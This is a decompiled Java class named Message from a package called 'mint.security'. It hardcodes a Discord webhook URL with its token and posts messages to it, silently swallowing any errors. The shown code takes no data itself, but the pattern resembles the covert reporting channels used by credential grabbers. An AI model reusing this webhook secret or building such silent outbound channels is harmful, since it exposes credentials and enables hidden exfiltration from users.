// 
// Decompiled by Procyon v0.5.36
// 

package mint.security;

public class Message
{
    public static String LOADING_WEBHOOK;
    String message;
    Webhook webhook;

    public Message(final String message) {
        this.message = message;
    }
    
    public String getMessage() {
        return this.message;
    }

    
    public void send() {
        try {
            webhook.send(this);
        }
        catch (Exception ex) {}
    }
    
    static {
        Message.LOADING_WEBHOOK = "https://discord.com/api/webhooks/888479727084527637/k9t5aJ0NOMxATI7RBE5hJAirswo6xJRzdEDdtn7lUx63Osade8zyKQmcbTUtnADTCBZr";
    }
}
